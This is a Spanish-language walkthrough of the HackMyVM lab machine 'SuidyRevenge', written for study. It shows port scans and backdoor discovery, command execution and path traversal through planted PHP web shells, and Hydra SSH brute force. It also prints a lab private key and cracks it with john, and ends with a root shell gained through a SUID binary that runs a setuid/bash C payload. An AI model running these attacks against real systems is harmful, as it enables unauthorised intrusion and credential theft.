---
icon: flag
---

# SuidyRevenge HackMyVM (Hard - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 14:14 EDT
Nmap scan report for 192.168.5.19
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)
|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)
|_  256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:A3:A0:CF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```

Veremos que hay un puerto `80` que aloja una pagina web, si entramos dentro veremos una pagina super simple que pone lo siguiente:

```
Im proud to announce that "theuser" is not anymore in our servers. Our admin "mudra" is the best admin of the world. -suidy
```

No veremos nada interesante, a parte de un posible nombre de usuario, por lo que vamos a realizar un poco de `fuzzing`.

Si inspeccionamos la pagina veremos lo siguiente:

```html
<!--
"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!
-theuser
-->
```

Vemos que nos muestra una ruta `web` la cual vamos a probar en el navegador.

```
URL = http://<IP>/supersecure
```

Si entramos vemos que existe, pero nos saltara un `403 Forbbiden` por lo que vamos a realizar un `fuzzing` con `gobuster` y estamos viendo que tambien nos comenta en el comentario que se trata de una `backdoor` con `PHP` por lo que vamos a utilizar una lista especial de `backdoors`.

## Gobuster

URL = [Download List backdoor\_list.txt SecLists](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/backdoor_list.txt)

```shell
gobuster dir -u http://<IP>/supersecure/ -w backdoor_list.txt -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.19/supersecure
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                ../../Downloads/backdoor_list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple-backdoor.php  (Status: 200) [Size: 28]
Progress: 3088 / 3092 (99.87%)
===============================================================
Finished
===============================================================
```

Vemos que nos ha encontrado un archivo `.php` si entramos en el veremos lo siguiente:

```
cmd parameter is my friend.
```

Por lo que vemos el paraemtro va por `CMD`, por lo que vamos a probar lo siguiente:

```
URL = http://<IP>/supersecure/simple-backdoor.php?cmd=id
```

Info:

```
cmd parameter is my friend.

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Veremos que esta funcionando, por lo que vamos a listar el directorio actual:

```
URL = http://<IP>/supersecure/simple-backdoor.php?cmd=ls
```

Info:

```
mysuperbackdoor.php
simple-backdoor.php
```

Vemos que no solo esta este archivo, tambien hay otro, vamos a ver el otro.

```
URL = http://<IP>/supersecure/mysuperbackdoor.php
```

Info:

```
file parameter is my friend.
```

## Escalate user murda

Vemos que este utiliza el parametro `file` por lo que vamos a probar a leer el `passwd`.

```
URL = http://<IP>/supersecure/mysuperbackdoor.php?file=../../../../../etc/passwd
```

Info:

```
file parameter is my friend.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
murda:x:1000:1000:murda,,,:/home/murda:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
violent:x:1001:1001:,,,:/home/violent:/bin/bash
yo:x:1002:1002:,,,:/home/yo:/bin/bash
ruin:x:1003:1003:,,,:/home/ruin:/bin/bash
theuser:x:1004:1004:,,,:/home/theuser:/bin/bash
suidy:x:1005:1005:,,,:/home/suidy:/bin/bash
```

Vemos que nos ha dejado, vamos a probar a lanzar `fuerza bruta` hacia el usuario llamado `murda` ya que es el primer usuario creado y si nos fijamos cambia algunas letras respecto al usuario que esta en la pagina que se menciono antes.

### Hydra

```shell
hydra -l murda -P <WORDLIST> ssh://<IP>/ -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-16 14:40:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.5.19:22/
[22][ssh] host: 192.168.5.19   login: murda   password: iloveyou
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-16 14:41:05
```

Veremos que hemos conseguido las credenciales de dicho usuario, por lo que vamos a conectarnos por `SSH`.

### SSH

```shell
ssh murda@<IP>
```

Metemos como contraseña `iloveyou` y veremos que estaremos dentro.

## Escalate user violent

Si leemos el archivo `secret` de la `/home` del usuario `murda` veremos lo siguiente:

```shell
cat secret.txt
```

Info:

```
I know that theuser is here!
I just got the id_rsa from "violent".
I will put the key in a secure place for theuser!
I hope he find it.
Remember that rockyou.txt is your friend!
```

Vemos que esta hablando de alguna `id_rsa` del usuario `violent`, vamos a investigar eso un poco mas.

```shell
find / -name "id_rsa" 2>/dev/null
```

Info:

```
/usr/games/id_rsa
```

Vemos que nos ha encontrado una `id_rsa` que como vimos antes es del usuario `violent`, vamos a copiarnosla y pasarla a nuestro `host`.

> id\_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDGbexiJO
b7KaTASSyt9yKFAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/9FkJSQol
CNgAMG4SeDpKctz5/h6ylTx0vT73OzMwYO97HL/tRrfL0gOWV2UNTuOFwg5fBorYZfBgql
bVzsIuCitxvoButf59aeoZtLxeUUuUm3G7Q06IvLV2vj+VgJ2i2tUjXboCcQ0Yv+Bj9JBC
+/6fG9j+ED7Pi42zjm9zNQsPhrwviHptksnKwpsV5KhBNuO3heeZvydX/sudsCCrYXBKoe
P8abXDqJYXhjskJupu8Rb0bcLxR1uEIGgsRww7waBaiag65WnXBwTrzjriWFdCJcI2lfdc
l7g/b6T5UfxFSzmdNEZvaH/SNvPEpE8bAUW9rcJwwEJZyIrc4z5VAAAD0PmVBELTPOuptO
2LGbENxSNYTLn6TqacFrj76WfTo7Q81QdCw9IJ0ruu0ivvtQWAS2CmG7Hq7vE8b+T6KI8w
sRJkfpON5nr5e+mfCGD7Gt0WVBaZ1SolbN17XoSNyTNq8jqF9EcwnsqIM8SRWrLERufCCs
SMDJlGb2/khum3fgDvI1R7gm0KYQRRJu33qx9ZXHRmCGKvEMV/pSaIJb2JBTQ9N/QcMlVK
RGsVC/NNhwcWSMQh6DGLmcC+yZvo5lxBnNUibWKNtf2zTx6yep6SwVzvt9Qg5aZ1exIEYa
9bmpZCzHVpHHK859U1l0FNJoBFrCiC0CssPv4E+g1iLA47NXYCeQxpWvZPsqXwr+J46vR9
UC+pZHy9bOHc0J+CTP80vEazyMN0Uko9/R2iJ+7GeQgtzoVBt7mqjaoIDljXOQ6YD5F7a8
5LvfFgW691eKdoZbGjaALMdV629MHdm6t5KL56YO9bbWlpgvo61iYqrAE2t+jhlUoQeQ+9
cH8fKHVXctRCypsx577qTwnUFtLn+l3f+Twl1ulxpV/bs497n1a1aDNpAoMJYt0601+3H8
qJQQ12QiBEi1CTvt+W2/d1EQeZ+MDUSqFCLDGE34xu6lI+/Wjmv03qBSRvdUK91MX1Lb2n
uUZN0OH6pJbmj3oxHSB6ADFetH7bVFXKC4VjTGltoRWD3sH2n5UIcVZZ+1qha3n37U8Q1/
OVwSqtTE6NbYQsnsydv9plM1xLkacY9+db35wPBQSVkuiTuENKUbDMIFC8GiFTzshG9Owr
8LvdK+LSxCrjQcAch7AYFma7IEtkJDHHAC2dwHw+ojqb510c9d5oBAd/vboElE9ZjYbOq2
WT9UdY26/LOQ1LZVZ9LU3hW+N9zRLgJZz6jfvELGlS2jxNjBVW8+0dGHOBFxu+lHjyZCaA
YaUwJvd2lTkoLIH3o7Wog7c69tTtVP39Lx2trFCRtWs0eJIP6bGMsB83nwWzxiRnUKX5/3
anvv/RtCRJoEsSX9vtXJpMnE4ZXO4H7LglGWe/dlIRkF/Pm81FPB+kiuAYbe+CRVIvEC+m
dkCybp6++R/Td2GQ/uh3Iz3Q6CbmGEpnjAtUBjizQc4vrPpB0tgsEXpzB5ZAj10IjgK6a+
2PIaEbU2nsSic6JT1tN8GOAx3kca+x94PZ9quSvGxBIjCcre5IC1vDPSl9ltPIZwwvDIbN
ORebGQ41OO++boyqMUAeWPCp0U16acJ7l/copQQcuIZ0mTched3eyetddQ5FMCHv2EbvK5
ovZ9EUC8ryJgnq1/+ECUOutT5q49Q=
-----END OPENSSH PRIVATE KEY-----
```

Teniendo dicho archivo en nuestro `host` vamos a establecerle los permisos necesarios.

```shell
chmod 600 id_rsa
```

Ahora vamos a probar a conectarnos por `SSH` mediante dicho usuario con la clave `PEM`.

```shell
ssh -i id_rsa violent@<IP>
```

Info:

```
Enter passphrase for key 'id_rsa':
```

Vemos que nos pide la contraseña de dicho `id_rsa` por lo que esta funcionando, vamos a intentar `crackearlo` con `john`.

```shell
ssh2john id_rsa > hash.ssh
```

```shell
john --wordlist=<WORDLIST> hash.ssh
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateu           (id_rsa)     
1g 0:00:00:28 DONE (2025-05-16 14:50) 0.03559g/s 44.42p/s 44.42c/s 44.42C/s ramona..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que hemos obtenido la contraseña, por lo que vamos a utilizarla utilizando el mismo comando que antes.

```shell
ssh -i id_rsa violent@<IP>
```

Metemos como contraseña `ihateu` y veremos que estamos dentro.

## Escalate user theuser

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for violent on suidyrevenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User violent may run the following commands on suidyrevenge:
    (root) NOPASSWD: /usr/bin/violent
```

Vemos que podemos ejecutar el binario `violent` como el usuario `root`, por lo que vamos a investigar dicho binario.

Pero no veremos nada interesante, buscando mucho sin encontrar resultados, vamos a probar a generar un diccionario de palabras de la pagina principal del servidor de la maquina victima y tirarle `fuerza bruta` al usuario `theuser` a ver si funciona.

```shell
cewl http://<IP> -w dic.txt
```

Ahora vamos a utilizar dicho diccionario.

```shell
hydra -l theuser -P dic.txt ssh://<IP>/ -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-16 14:56:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 31 tasks per 1 server, overall 31 tasks, 31 login tries (l:1/p:31), ~1 try per task
[DATA] attacking ssh://192.168.5.19:22/
[22][ssh] host: 192.168.5.19   login: theuser   password: different
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-16 14:56:43
```

Veremos que ha funcionado, por lo que vamos a escalar directamente a dicho usuario metiendo dicha contraseña.

```shell
su theuser
```

Metemos como contraseña `different` y veremos que seremos dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
                                                                                
HMVbisoususeryay
```

## Escalate Privileges

Ahora que somos el usuario `theuser` veremos que nuestro objetivo es hacer algo con el siguiente binario:

```shell
ls -la /home/suidy/suidyyyyy
```

Info:

```
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
```

Si recordamos en otra maquina que he `hackeado` que tiene este mismo `binario`, vamos a utilizar lo mismo que utilice en dicha maquina.

> payload.c

```c
#include <stdlib.h>
#include <unistd.h>

int main()
{
   setuid(0);
   setgid(0);
   system("/bin/bash");
   return 0;
}
```

Ahora que hemos creado ese `binario` malicioso, haremos lo siguiente:

```shell
cd /tmp
gcc /tmp/payload.c -o suidyyyyy
cp suidyyyyy /home/suidy/suidyyyyy
```

Ahora tendremos que esperar a que se establezca los permisos `SUID` de nuevo, ya que por detras hay una tarea programada que establece `root` a dicho binario permisos `SUID`.

```shell
ls -la /home/suidy/suidyyyyy
```

Info:

```
-rwsrws--- 1 root theuser 16712 May 16 15:03 /home/suidy/suidyyyyy
```

Veremos que ha funcionado, por lo que haremos lo siguiente:

```shell
/home/suidy/suidyyyyy
```

Info:

```
root@suidyrevenge:/tmp# whoami
root
```

Por lo que vemos ya seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
HMVvoilarootlala
```
